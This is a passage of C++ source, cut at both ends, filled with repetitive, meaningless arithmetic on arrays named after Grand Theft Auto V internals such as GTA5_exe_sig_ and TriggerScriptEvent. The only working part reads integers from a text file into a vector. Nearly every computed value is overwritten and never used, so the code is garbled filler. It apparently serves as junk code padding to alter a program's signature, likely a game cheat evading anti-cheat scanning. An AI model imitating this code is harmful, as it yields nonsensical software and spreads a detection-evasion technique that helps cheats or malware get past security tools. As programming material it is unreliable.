				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				std::vector<int> TempVECTOR;
				ifstream imput(TXTFilePath);
				string textolido;
				for (string line; getline(imput, line);)
					TempVECTOR.push_back(stoi(line));
				return TempVECTOR;
			}
		}
		namespace Float
		{
			int PED_TO_NET_ = 2;
			int NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			int offset = (PED_TO_NET_ * 0xA) + 0xBB;
			int  GTA5_exe_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			double a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			double a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			int GTA5_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  GTA5_exe_sig_ss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			int  GTA5_sig_ss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  arrassyssd[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			float a = 0.0f;
			float b = 0.0f;
			int  GTA5_exe_sig_Zero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			double sa1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			int GTA5_sig_2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int offsetw = (PED_TO_NET_ * 0xA) + 0xBB;
			int  GTA5_sig_10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  GTA5_sig_ss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  arrassyss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			int  Eduardo[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_exe_sig_Dois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			double sa1w = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			int  GTA5_sig_2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  GTA5_sig_3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };

			int ponteiro = 2;
			int aaaaaa = ponteiro * 2;
			int  matriz[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  matrizss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			int  enderecoss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  matrizZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  endereco10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  enderecoss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int matrizDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  endereco2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  endereco3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  TriggerScriptEvent[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  TriggerScriptEventss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			int  TriggerScriptEventZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int TriggerScriptEventDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			std::vector<float> GetValues()
			{
				if (offset > aaaaaa)
				{
